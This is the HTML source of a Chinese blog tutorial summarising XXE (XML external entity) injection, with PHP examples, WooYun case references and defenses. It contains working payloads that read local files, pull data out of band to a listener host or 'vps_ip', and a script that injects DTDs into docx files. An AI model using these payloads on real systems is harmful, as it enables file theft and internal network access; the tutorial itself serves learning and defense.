<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>XML外部实体注入小结 | 闲言语</title><meta name=keywords content><meta name=description content="本文发自 先知社区 ，转载请注明出处。
（ 这个问题资料很多了，细节也颇多，本文涉及的内容只是最基本的，描述得也难比以往的好，仅仅是记录所学。对于已经理解XXE基本情况的读者，阅读真实案例和生成恶意Word文档两部分可能会有收获。）
WHAT XML XML是类似HTML的标记语言，但它们有所不同。
其一，HTML用于表现数据，关注数据的表现形式，XML用于存储和传输数据，关注数据本身。 其二，HTML的标签是预定义的，而XML的标签是自定义的，或者说，任意的。 此外，XML语法更严格，其标签必须闭合且正确嵌套，大小写敏感，属性值必须加引号，保留连续空白符。 <?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34; standalone=&#34;yes&#34;?> 称为 XML prolog ，用于声明XML文档的版本和编码，是可选的，必须放在文档开头。standalone值是yes的时候表示DTD仅用于验证文档结构，从而外部实体将被禁用，但它的默认值是no，而且有些parser会直接忽略这一项。 DTD XML元素以形如 <tag>foo</tag> 的标签开始和结束，如果元素内部出现如< 的特殊字符，解析就会失败，为了避免这种情况，XML用实体引用（entity reference）替换特殊字符。XML预定义了五个实体引用，即用&amp;lt; &amp;gt; &amp;amp; &amp;apos; &amp;quot; 替换 < > & ' &#34; 。
实际上，实体引用可以起到类似宏定义和文件包含的效果，为了方便，我们会希望自定义实体引用，这个操作在称为 Document Type Defination（DTD，文档类型定义）的过程中进行。DTD是XML文档中的几条语句，用来说明哪些元素/属性是合法的以及元素间应当怎样嵌套/结合，也用来将一些特殊字符和可复用代码段自定义为实体。
DTD有两种形式：
1 2 3 4 5 内部 DTD：<!DOCTYPE 根元素 [元素声明]> 外部 DTD： <!DOCTYPE 根元素 SYSTEM &#34;存放元素声明的文件的URI，可以是本地文件或网络文件&#34; [可选的元素声明]> <!DOCTYPE 根元素 PUBLIC &#34;PUBLIC_ID DTD的名称&#34; &#34;外部DTD文件的URI&#34;> （ PUBLIC表示 DTD文件是公共的，解析器先分析 DTD名称，没查到再去访问 URI） ENTITY 我们可以在元素声明中自定义实体，和DTD类似也分为内部实体和外部实体，此外还有普通实体和参数实体之分："><meta name=author content><link rel=canonical href=https://ret2neo.cn/post/180811-xxe-injection/><link crossorigin=anonymous href=/assets/css/stylesheet.42b1e004fb78db2fc933d33c9db659598f62453f0de6f9db50c85e5936c0d8c3.css integrity="sha256-QrHgBPt42y/JM9M8nbZZWY9iRT8N5vnbUMheWTbA2MM=" rel="preload stylesheet" as=style><script defer crossorigin=anonymous src=/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG+9vmJ0cTS+ovo0FeA=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://ret2neo.cn/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://ret2neo.cn/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://ret2neo.cn/favicon-32x32.png><link rel=apple-touch-icon href=https://ret2neo.cn/apple-touch-icon.png><link rel=mask-icon href=https://ret2neo.cn/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--hljs-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:title" content="XML外部实体注入小结"><meta property="og:description" content="本文发自 先知社区 ，转载请注明出处。
（ 这个问题资料很多了，细节也颇多，本文涉及的内容只是最基本的，描述得也难比以往的好，仅仅是记录所学。对于已经理解XXE基本情况的读者，阅读真实案例和生成恶意Word文档两部分可能会有收获。）
WHAT XML XML是类似HTML的标记语言，但它们有所不同。
其一，HTML用于表现数据，关注数据的表现形式，XML用于存储和传输数据，关注数据本身。 其二，HTML的标签是预定义的，而XML的标签是自定义的，或者说，任意的。 此外，XML语法更严格，其标签必须闭合且正确嵌套，大小写敏感，属性值必须加引号，保留连续空白符。 <?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34; standalone=&#34;yes&#34;?> 称为 XML prolog ，用于声明XML文档的版本和编码，是可选的，必须放在文档开头。standalone值是yes的时候表示DTD仅用于验证文档结构，从而外部实体将被禁用，但它的默认值是no，而且有些parser会直接忽略这一项。 DTD XML元素以形如 <tag>foo</tag> 的标签开始和结束，如果元素内部出现如< 的特殊字符，解析就会失败，为了避免这种情况，XML用实体引用（entity reference）替换特殊字符。XML预定义了五个实体引用，即用&amp;lt; &amp;gt; &amp;amp; &amp;apos; &amp;quot; 替换 < > & ' &#34; 。
实际上，实体引用可以起到类似宏定义和文件包含的效果，为了方便，我们会希望自定义实体引用，这个操作在称为 Document Type Defination（DTD，文档类型定义）的过程中进行。DTD是XML文档中的几条语句，用来说明哪些元素/属性是合法的以及元素间应当怎样嵌套/结合，也用来将一些特殊字符和可复用代码段自定义为实体。
DTD有两种形式：
1 2 3 4 5 内部 DTD：<!DOCTYPE 根元素 [元素声明]> 外部 DTD： <!DOCTYPE 根元素 SYSTEM &#34;存放元素声明的文件的URI，可以是本地文件或网络文件&#34; [可选的元素声明]> <!DOCTYPE 根元素 PUBLIC &#34;PUBLIC_ID DTD的名称&#34; &#34;外部DTD文件的URI&#34;> （ PUBLIC表示 DTD文件是公共的，解析器先分析 DTD名称，没查到再去访问 URI） ENTITY 我们可以在元素声明中自定义实体，和DTD类似也分为内部实体和外部实体，此外还有普通实体和参数实体之分："><meta property="og:type" content="article"><meta property="og:url" content="https://ret2neo.cn/post/180811-xxe-injection/"><meta property="article:section" content="post"><meta property="article:published_time" content="2018-08-11T19:18:24+08:00"><meta property="article:modified_time" content="2018-08-11T19:18:24+08:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="XML外部实体注入小结"><meta name=twitter:description content="本文发自 先知社区 ，转载请注明出处。
（ 这个问题资料很多了，细节也颇多，本文涉及的内容只是最基本的，描述得也难比以往的好，仅仅是记录所学。对于已经理解XXE基本情况的读者，阅读真实案例和生成恶意Word文档两部分可能会有收获。）
WHAT XML XML是类似HTML的标记语言，但它们有所不同。
其一，HTML用于表现数据，关注数据的表现形式，XML用于存储和传输数据，关注数据本身。 其二，HTML的标签是预定义的，而XML的标签是自定义的，或者说，任意的。 此外，XML语法更严格，其标签必须闭合且正确嵌套，大小写敏感，属性值必须加引号，保留连续空白符。 <?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34; standalone=&#34;yes&#34;?> 称为 XML prolog ，用于声明XML文档的版本和编码，是可选的，必须放在文档开头。standalone值是yes的时候表示DTD仅用于验证文档结构，从而外部实体将被禁用，但它的默认值是no，而且有些parser会直接忽略这一项。 DTD XML元素以形如 <tag>foo</tag> 的标签开始和结束，如果元素内部出现如< 的特殊字符，解析就会失败，为了避免这种情况，XML用实体引用（entity reference）替换特殊字符。XML预定义了五个实体引用，即用&amp;lt; &amp;gt; &amp;amp; &amp;apos; &amp;quot; 替换 < > & ' &#34; 。
实际上，实体引用可以起到类似宏定义和文件包含的效果，为了方便，我们会希望自定义实体引用，这个操作在称为 Document Type Defination（DTD，文档类型定义）的过程中进行。DTD是XML文档中的几条语句，用来说明哪些元素/属性是合法的以及元素间应当怎样嵌套/结合，也用来将一些特殊字符和可复用代码段自定义为实体。
DTD有两种形式：
1 2 3 4 5 内部 DTD：<!DOCTYPE 根元素 [元素声明]> 外部 DTD： <!DOCTYPE 根元素 SYSTEM &#34;存放元素声明的文件的URI，可以是本地文件或网络文件&#34; [可选的元素声明]> <!DOCTYPE 根元素 PUBLIC &#34;PUBLIC_ID DTD的名称&#34; &#34;外部DTD文件的URI&#34;> （ PUBLIC表示 DTD文件是公共的，解析器先分析 DTD名称，没查到再去访问 URI） ENTITY 我们可以在元素声明中自定义实体，和DTD类似也分为内部实体和外部实体，此外还有普通实体和参数实体之分："><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://ret2neo.cn/post/"},{"@type":"ListItem","position":2,"name":"XML外部实体注入小结","item":"https://ret2neo.cn/post/180811-xxe-injection/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"XML外部实体注入小结","name":"XML外部实体注入小结","description":"本文发自 先知社区 ，转载请注明出处。\n（ 这个问题资料很多了，细节也颇多，本文涉及的内容只是最基本的，描述得也难比以往的好，仅仅是记录所学。对于已经理解XXE基本情况的读者，阅读真实案例和生成恶意Word文档两部分可能会有收获。）\nWHAT XML XML是类似HTML的标记语言，但它们有所不同。\n其一，HTML用于表现数据，关注数据的表现形式，XML用于存储和传输数据，关注数据本身。 其二，HTML的标签是预定义的，而XML的标签是自定义的，或者说，任意的。 此外，XML语法更严格，其标签必须闭合且正确嵌套，大小写敏感，属性值必须加引号，保留连续空白符。 \u0026lt;?xml version=\u0026quot;1.0\u0026quot; encoding=\u0026quot;UTF-8\u0026quot; standalone=\u0026quot;yes\u0026quot;?\u0026gt; 称为 XML prolog ，用于声明XML文档的版本和编码，是可选的，必须放在文档开头。standalone值是yes的时候表示DTD仅用于验证文档结构，从而外部实体将被禁用，但它的默认值是no，而且有些parser会直接忽略这一项。 DTD XML元素以形如 \u0026lt;tag\u0026gt;foo\u0026lt;/tag\u0026gt; 的标签开始和结束，如果元素内部出现如\u0026lt; 的特殊字符，解析就会失败，为了避免这种情况，XML用实体引用（entity reference）替换特殊字符。XML预定义了五个实体引用，即用\u0026amp;lt; \u0026amp;gt; \u0026amp;amp; \u0026amp;apos; \u0026amp;quot; 替换 \u0026lt; \u0026gt; \u0026amp; ' \u0026quot; 。\n实际上，实体引用可以起到类似宏定义和文件包含的效果，为了方便，我们会希望自定义实体引用，这个操作在称为 Document Type Defination（DTD，文档类型定义）的过程中进行。DTD是XML文档中的几条语句，用来说明哪些元素/属性是合法的以及元素间应当怎样嵌套/结合，也用来将一些特殊字符和可复用代码段自定义为实体。\nDTD有两种形式：\n1 2 3 4 5 内部 DTD：\u0026lt;!DOCTYPE 根元素 [元素声明]\u0026gt; 外部 DTD： \u0026lt;!DOCTYPE 根元素 SYSTEM \u0026#34;存放元素声明的文件的URI，可以是本地文件或网络文件\u0026#34; [可选的元素声明]\u0026gt; \u0026lt;!DOCTYPE 根元素 PUBLIC \u0026#34;PUBLIC_ID DTD的名称\u0026#34; \u0026#34;外部DTD文件的URI\u0026#34;\u0026gt; （ PUBLIC表示 DTD文件是公共的，解析器先分析 DTD名称，没查到再去访问 URI） ENTITY 我们可以在元素声明中自定义实体，和DTD类似也分为内部实体和外部实体，此外还有普通实体和参数实体之分：","keywords":[],"articleBody":"本文发自 先知社区 ，转载请注明出处。\n（ 这个问题资料很多了，细节也颇多，本文涉及的内容只是最基本的，描述得也难比以往的好，仅仅是记录所学。对于已经理解XXE基本情况的读者，阅读真实案例和生成恶意Word文档两部分可能会有收获。）\nWHAT XML XML是类似HTML的标记语言，但它们有所不同。\n其一，HTML用于表现数据，关注数据的表现形式，XML用于存储和传输数据，关注数据本身。 其二，HTML的标签是预定义的，而XML的标签是自定义的，或者说，任意的。 此外，XML语法更严格，其标签必须闭合且正确嵌套，大小写敏感，属性值必须加引号，保留连续空白符。 \u003c?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?\u003e 称为 XML prolog ，用于声明XML文档的版本和编码，是可选的，必须放在文档开头。standalone值是yes的时候表示DTD仅用于验证文档结构，从而外部实体将被禁用，但它的默认值是no，而且有些parser会直接忽略这一项。 DTD XML元素以形如 foo 的标签开始和结束，如果元素内部出现如\u003c 的特殊字符，解析就会失败，为了避免这种情况，XML用实体引用（entity reference）替换特殊字符。XML预定义了五个实体引用，即用\u0026lt; \u0026gt; \u0026amp; \u0026apos; \u0026quot; 替换 \u003c \u003e \u0026 ' \" 。\n实际上，实体引用可以起到类似宏定义和文件包含的效果，为了方便，我们会希望自定义实体引用，这个操作在称为 Document Type Defination（DTD，文档类型定义）的过程中进行。DTD是XML文档中的几条语句，用来说明哪些元素/属性是合法的以及元素间应当怎样嵌套/结合，也用来将一些特殊字符和可复用代码段自定义为实体。\nDTD有两种形式：\n1 2 3 4 5 内部 DTD：\u003c!DOCTYPE 根元素 [元素声明]\u003e 外部 DTD： \u003c!DOCTYPE 根元素 SYSTEM \"存放元素声明的文件的URI，可以是本地文件或网络文件\" [可选的元素声明]\u003e \u003c!DOCTYPE 根元素 PUBLIC \"PUBLIC_ID DTD的名称\" \"外部DTD文件的URI\"\u003e （ PUBLIC表示 DTD文件是公共的，解析器先分析 DTD名称，没查到再去访问 URI） ENTITY 我们可以在元素声明中自定义实体，和DTD类似也分为内部实体和外部实体，此外还有普通实体和参数实体之分：\n1 2 3 4 5 6 7 8 9 声明： \u003c!DOCTYPE 根元素 [\u003c!ENTITY 内部普通实体名 \"实体所代表的字符串\"\u003e]\u003e \u003c!DOCTYPE 根元素 [\u003c!ENTITY 外部普通实体名 SYSTEM \"外部实体的URI\"\u003e]\u003e \u003c!DOCTYPE 根元素 [\u003c!ENTITY % 内部参数实体名 \"实体所代表的字符串\"\u003e]\u003e \u003c!DOCTYPE 根元素 [\u003c!ENTITY % 外部参数实体名 SYSTEM \"外部实体的URI\"\u003e]\u003e 除了 SYSTEM关键字外，外部实体还可用 PUBLIC关键字声明。 引用： \u0026普通实体名; //经实验，普通实体既可以在 DTD中，也可以在 XML中引用，可以在声明前引用，可以在在元素声明内部引用 %参数实体名; //经实验，参数实体只能在 DTD中引用，不能在声明前引用,不能在元素声明内部引用 可能造成的危害 本地文件读取 内网访问，主机/端口扫描 网络访问 系统命令执行（特定协议，如PHP的expect） 拒绝服务（嵌套引用，指数爆炸） HOW URI支持的协议：\n利用引用外部DTD发起网络请求 test.php 使用外部DTD对XML进行验证，如果XML可以注入且DTD的URI可控，就有发起网络请求的可能。在192.168.1.2:80 有Web服务而192.168.1.3:80 没有，DTD的URI不同时访问 test.php 就会得到不同的响应。\ntest.php\n1 2 3 4 5 6 \u003c?php // error_reporting(0); $dom = new DOMDocument; $dom-\u003eload('with_external_dtd.xml'); if ($dom-\u003evalidate()) {echo \"validated!\\n\";} else echo \"invalid!\\n\"; with_external_dtd.xml\n1 2 3 4 5 6 7 8 \u003c?xml version=\"1.0\"?\u003e \u003c!DOCTYPE note SYSTEM \"external_dtd\"\u003e Valar Morghulis external_dtd\n1 \u003c!ELEMENT note (#PCDATA)\u003e 利用普通XXE读取文件/访问网络 1 2 3 4 5 6 \u003c?php $s=\u003c\u003c\u003cstring \u003c!DOCTYPE a [\u003c!ENTITY b SYSTEM \"file:///C:/Windows/win.ini\"\u003e]\u003e \u003cc\u003e\u0026b;\u003c/c\u003e string; echo simplexml_load_string($s); 利用参数XXE读取文件/访问网络 1 2 3 4 5 6 7 \u003c?php $s=\u003c\u003c\u003cstring \u003c!DOCTYPE a [\u003c!ENTITY % b SYSTEM \"http://127.0.0.1:8088/evil.txt\"\u003e%b;]\u003e \u003cc\u003e\u0026d;\u003c/c\u003e string; echo simplexml_load_string($s); // evil.txt : \u003c!ENTITY d SYSTEM \"php://filter/convert.base64-encode/resource=C:/Windows/win.ini\"\u003e XXE OOB 如果没有回显也没关系，可以利用外部参数实体将文件内容发送出去。这里注意参数实体引用 %file; 必须放在外部文件里，因为根据这条 规则 ，在内部DTD里， 参数实体引用只能和元素同级而不能直接出现在元素声明内部，否则parser会报错： PEReferences forbidden in internal subset 。这里的internal subset 指的是中括号[] 内部的一系列元素声明，PEReferences 指的应该是参数实体引用 Parameter-Entity Reference 。\n感觉在技术方面英文的表达力更强，这种情况叫做 fetch external parsed entities using PEReference 更好理解。\n1 2 3 4 5 6 7 8 9 10 \u003c?php $s=\u003c\u003c\u003cstring \u003c!DOCTYPE a [\u003c!ENTITY % xxe SYSTEM \"http://127.0.0.1:8088/xxe.txt\"\u003e %xxe;]\u003e string; simplexml_load_string($s); /* // http://127.0.0.1:8088/xxe.txt: \u003c!ENTITY % file SYSTEM \"php://filter/convert.base64-encode/resource=C:/Windows/win.ini\"\u003e \u003c!ENTITY % x '\u003c!ENTITY \u0026#37; send SYSTEM \"http://127.0.0.1:8088/%file;\"\u003e'\u003e %x; %send; */ 真实案例 在线文件预览引起的问题，修改docx文件的word/document.xml，添加DTD和实体引用，即可触发。 WooYun-2014-73321（网易邮箱某处XXE可读取文件） WooYun-2014-73439（QQ邮箱XXE可读取任意文件） …… 直接处理POST XML数据。WooYun-2015-109725（中通某处XXE漏洞可读取服务器任意文件）等很多。许多是直接 simplexml_load_string 处理POST进来的数据。可控字符串出现在XML文件里就要引起注意。 XML处理工具 WooYun-2014-59911（从开源中国的某XXE漏洞到主站shell）格式化XML。 WooYun-2015-134057（百度某平台Blind XXE漏洞\u0026可Bool型SSRF攻击）XML检查工具。 WooYun-2015-135397（搜狗某平台Blind XXE漏洞(读取文件/SSRF/Struts2命令执行) XML检查工具 WooYun-2014-58381（百度某功能XML实体注入）该功能点提供svg转jpg服务，通过构造特殊svg文件注入。 WooYun-2014-74069（鲜果网RSS导入Blind XXE漏洞 ）导入OPML文件。 WooYun-2015-111828（博客园某处XXE可下载任意文件）博客搬家功能，导入XML。 WooYun-2015-117316（用友人力资源管理软件全版本XXE漏洞 ）登陆与重置密码时使用XML传输数据。 WooYun-2015-148793（AOL Website XML External Entity(XXE) Vulnerability）xmlrpc service。 WooYun-2015-156208（国际php框架slim架构上存在XXE漏洞（XXE的典型存在形式））服务端根据请求的 content-type 来区别对待提交的数据。application/x-www-form-urlencoded 、application/json 、application/xml 被用不同的方式解析。XML直接调用 simplexml_load_string 处理导致漏洞。有趣的是旧版本对该问题做了防范，新版本去除了相关代码，可能是觉得新版本对PHP版本需求在5.5以上。实际上PHP是否解析外部实体与本身版本无关，与编译时libxml库版本有关。 WooYun-2016-168457（唯品会存在Blind XXE 漏洞）。作者说 关于XXE,觉得漏洞本身没太多的玩点，比较有意思主要在于：不同语言处理URI的多元化和不同XML解析器在解析XML的一些特性。 ，我觉得有道理。xfire是流行的webservice开发组件，其在invoke时使用了STAX解析XML导致XML实体注入发生 。乌云上一大波XXE洞都是这个，详细说明见 WooYun-2016-166751(Xfire文件读取漏洞)。 WooYun-2014-59911（从开源中国的某XXE漏洞到主站shell）XXE读取到脚本文件/home/run/ssh_go.sh ，内含SSH登陆密码 orz。 一些其他案例 XXE in OpenID: one bug to rule them all, or how I found a Remote Code Execution flaw affecting Facebook’s servers 【Facebook OpenID功能点的XRDS XXE】 Revisting XXE and abusing protocols 的分析者利用该原理在其他OpenID平台结合expect模块实现了RCE。 XXE on Windows system …then what ?? 【XXE+SMB=\u003e内网RCE】 Apache Solr XXE漏洞分析 -【CVE-2018-8026 】 Phone Call to XXE via Interactive Voice Response 【打个电话也能XXE :)】 发现XXE 尝试注入特殊字符，使XML失效，引发解析异常，明确后端使用XML传输数据。\n单双引号 ' \" 。XML的属性值必须用引号包裹，而数据可能进入标签的属性值。 尖括号\u003c \u003e。XML的开始/结束标签用尖括号包裹，数据中出现尖括号会引发异常。 注释符 作注释。 \u0026 。\u0026 用于引用实体。 CDATA 分隔符]]\u003e 。\u003c![CDATA[foo]]\u003e 中的内容不被parser解析，提前闭合引发异常。 尝试利用实体和DTD。\n引用外部DTD文件访问内网主机/端口。\u003c!DOCTYPE a SYSTEM \"http://127.0.0.1:2333\"\u003e （看响应时间） 引用外部DTD文件访问外网。\u003c!DOCTYPE a SYSTEM \"http://vps_ip\" \u003e 引用内部实体。\u003c!DOCTYPE a [\u003c!ENTITY xxe \"findneo\"\u003e]\u003e\u0026xxe; 外部实体读本地文件。\u003c!DOCTYPE a [\u003c!ENTITY xxe SYSTEM \"file:///etc/hosts\"\u003e]\u003e\u0026xxe; 外部实体访问内网主机/端口。\u003c!DOCTYPE a SYSTEM \"http://192.168.1.2:80\"\u003e （看响应时间） 外部实体访问外网。\u003c!DOCTYPE a [\u003c!ENTITY xxe SYSTEM \"http://vps_ip\"\u003e]\u003e\u0026xxe; 判断问题存在可以OOB提取数据。 生成恶意Word文档 上面提到的多个案例都需要用到自定义DTD的docx文件，有个名为 XXEGen 的在线网站可以方便地生成和监听（也可自定义监听地址），从而方便快速地测试XXE是否存在，但目前看来还不支持自定义DTD，如果需要用到OOB之类的技术，可能就不太方便。\n所以我写了个小脚本，可以用来生成一个正常docx文件，然后注入自定义的DTD和实体引用。另外新版的word软件默认禁用DTD，trigger 函数还可以本地测试下word文件是否有问题。\n其实修改 docx 文件的原理很简单，手动也可以做。解压 demo.docx 到 demo文件夹 ，直接修改 demo/word/document.xml 文件内容，全选 demo 文件夹中的文件，使用 7zip 的仅存储方式压缩成 demo2.docx 即可。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 \u003c?php // by https://github.com/findneo function genword($filename,$filecontent){ $word = new COM(\"word.application\") or die(\"Unable to instantiate Word\"); $word-\u003eVisible = 0;//保持程序在后台运行 $word-\u003eDocuments-\u003eAdd();//新建Word文档 $word-\u003eSelection-\u003eTypeText($filecontent);//写入指定内容 $word-\u003eDocuments[1]-\u003eSaveAs(getcwd().\"/\".$filename);//保存到指定路径 $word-\u003eQuit();//退出程序 } function poisonWord($filename,$flag,$dtd,$entity_reference) { $zip = new ZipArchive(); $zip-\u003eopen($filename); $xml=$zip-\u003egetFromName('word/document.xml'); $prolog='\u003c?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?\u003e'; $evilxml=str_replace([$prolog,$flag],[$prolog.$dtd,$flag.$entity_reference],$xml);//构造恶意XML $zip-\u003edeleteName('word/document.xml'); $zip-\u003eaddFromString(\"word/document.xml\",$evilxml);//更新docx文件 $zip-\u003eclose(); } function trigger($filename){ $zip = new ZipArchive(); $zip-\u003eopen($filename); $xml=$zip-\u003egetFromName('word/document.xml'); $doc_xml = new DOMDocument(); $doc_xml-\u003eloadXML($xml); //加载word文档 $zip-\u003eclose(); return $doc_xml-\u003etextContent; //读取文档内容 } //在这里定义想要添加的DTD内容和想要在XML中引用的实体 $dtd='\u003c!DOCTYPE ANY [\u003c!ENTITY xxe SYSTEM \"http://127.0.0.1:8088/?findneo\"\u003e\u003c!ENTITY int \"XXE\"\u003e]\u003e'; $entity_reference=\"\u0026xxe; \u0026int; IS EXCITING!\"; $name=\"demo.docx\";//生成文件的文件名 $flag=\"Across the Great Wall we can reach every corner in the world.\";//文件内容，实体在该内容附近引用。 genWord($name,$flag);//生成一个指定内容和文件名的正常docx文件 poisonWord($name,$flag,$dtd,$entity_reference);//向正常文件注入DTD和实体引用，生成恶意文件 echo trigger($name);//加载文件，测试效果 //若程序不能正常运行，可尝试在 php.ini 末尾添加以下路径 //extension=\"php_com_dotnet.dll 路径\"; extension=\"php_mbstring.dll 路径\" ?\u003e 此外，Github项目 oxml_xxe 支持更多文件类型。\n防御 彻底禁用DTD是最好的，退一步，禁用外部实体/外部DTD也可以。具体参考 XML_External_Entity_(XXE)_Prevention_Cheat_Sheet 。\n禁用外部实体 ( http://cn2.php.net/libxml_disable_entity_loader 等) 对于PHP来说，尽管不同环境下simplexml_load_string() 默认行为并不一致，但为了安全应当总是libxml_disable_entity_loader(); 。 检验数据来源，过滤数据 PHP及其他语言或框架，是否默认解析外部实体，解析方式和在特定场景下的解析表现，与其使用的 libxml2 版本有关（如果是基于libxml2的话），也与XML解析器及其配置有关。就PHP而言，libxml2 Version 可以在phpinfo里看，本文使用的是2.7.8 。\n这可能是一个误解的结果。\n在slimphp2中，官方是对这块进行一定处理了（。。。一些代码。。。）不知为何在3.0版本中官方就无视这个问题了。 我猜可能有两个原因：\n1.官方注意到了这个问题，但认为3.0版本需求的php版本在5.5以上，而错以为5.5以上的php就已经不存在XXE的隐患了。但实际上XML外部实体的解析，和php版本并无关系，而是和编译时的libxml库版本有关。\n2.官方尚未注意到这个问题。\n感觉前者的可能性较大。\n—— wooyun-2015-0156208\n可以结合 change log 和 GitHub commit 了解 libxml2 各版本具体改动。\n可以看到与主题较相关的有：\n1 2 3 4 5 6 7 8 9 10 11 v2.9.5: Sep 04 2017 Security:Detect infinite recursion in parameter entities (Nick Wellnhofer) Prevent unwanted external entity reference v2.9.2: Oct 16 2014 Security: Fix for CVE-2014-3660 billion laugh variant (Daniel Veillard), CVE-2014-0191 Do not fetch external parameter entities (Daniel Veillard) 2.9.1: Apr 19 2013 Activate detection of encoding in external subset 2.9.0: Sep 11 2012 Do not fetch external parsed entities 扩展阅读 XML Out-Of-Band Data Retrieval XMLDTDEntityAttacks.pdf XML External Entity (XXE) Processing 未知攻焉知防——XXE漏洞攻防 DTD Cheat Sheet DTD - Syntax Information Security / infosec / XXE XXE_payloads DTD Tutorial Extensible Markup Language (XML) 1.0 (Fifth Edition) about XML entity at msdn Spring MVC xml绑定pojo造成的XXE （乌云papers-1911） Oracle盲注结合XXE漏洞远程获取数据（乌云papers-6035） ","wordCount":"794","inLanguage":"en","datePublished":"2018-08-11T19:18:24+08:00","dateModified":"2018-08-11T19:18:24+08:00","mainEntityOfPage":{"@type":"WebPage","@id":"https://ret2neo.cn/post/180811-xxe-injection/"},"publisher":{"@type":"Organization","name":"闲言语","logo":{"@type":"ImageObject","url":"https://ret2neo.cn/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://ret2neo.cn/ accesskey=h title="闲言语 (Alt + H)">闲言语</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://ret2neo.cn/mind/ title=随笔><span>随笔</span></a></li><li><a href=https://ret2neo.cn/about title=关于><span>关于</span></a></li><li><a href=https://ret2neo.cn/search title="搜索 (Alt + /)" accesskey=/><span>搜索</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><h1 class=post-title>XML外部实体注入小结</h1><div class=post-meta><span title='2018-08-11 19:18:24 +0800 CST'>August 11, 2018</span>&nbsp;|&nbsp;<a href=https://github.dev/findneo/priblog/content/post/180811-xxe-injection.md rel="noopener noreferrer" target=_blank>edit</a></div></header><aside id=toc-container class="toc-container wide"><div class=toc><details open><summary accesskey=c title="(Alt + C)"><span class=details>目录</span></summary><div class=inner><ul><li><a href=#what aria-label=WHAT>WHAT</a><ul><li><a href=#xml aria-label=XML>XML</a></li><li><a href=#dtd aria-label=DTD>DTD</a></li><li><a href=#entity aria-label=ENTITY>ENTITY</a></li><li><a href=#%e5%8f%af%e8%83%bd%e9%80%a0%e6%88%90%e7%9a%84%e5%8d%b1%e5%ae%b3 aria-label=可能造成的危害>可能造成的危害</a></li></ul></li><li><a href=#how aria-label=HOW>HOW</a><ul><li><a href=#%e5%88%a9%e7%94%a8%e5%bc%95%e7%94%a8%e5%a4%96%e9%83%a8dtd%e5%8f%91%e8%b5%b7%e7%bd%91%e7%bb%9c%e8%af%b7%e6%b1%82 aria-label=利用引用外部DTD发起网络请求>利用引用外部DTD发起网络请求</a></li><li><a href=#%e5%88%a9%e7%94%a8%e6%99%ae%e9%80%9axxe%e8%af%bb%e5%8f%96%e6%96%87%e4%bb%b6%e8%ae%bf%e9%97%ae%e7%bd%91%e7%bb%9c aria-label=利用普通XXE读取文件/访问网络>利用普通XXE读取文件/访问网络</a></li><li><a href=#%e5%88%a9%e7%94%a8%e5%8f%82%e6%95%b0xxe%e8%af%bb%e5%8f%96%e6%96%87%e4%bb%b6%e8%ae%bf%e9%97%ae%e7%bd%91%e7%bb%9c aria-label=利用参数XXE读取文件/访问网络>利用参数XXE读取文件/访问网络</a></li><li><a href=#xxe-oob aria-label="XXE OOB">XXE OOB</a></li></ul></li><li><a href=#%e7%9c%9f%e5%ae%9e%e6%a1%88%e4%be%8b aria-label=真实案例>真实案例</a></li><li><a href=#%e5%8f%91%e7%8e%b0xxe aria-label=发现XXE>发现XXE</a></li><li><a href=#%e7%94%9f%e6%88%90%e6%81%b6%e6%84%8fword%e6%96%87%e6%a1%a3 aria-label=生成恶意Word文档>生成恶意Word文档</a></li><li><a 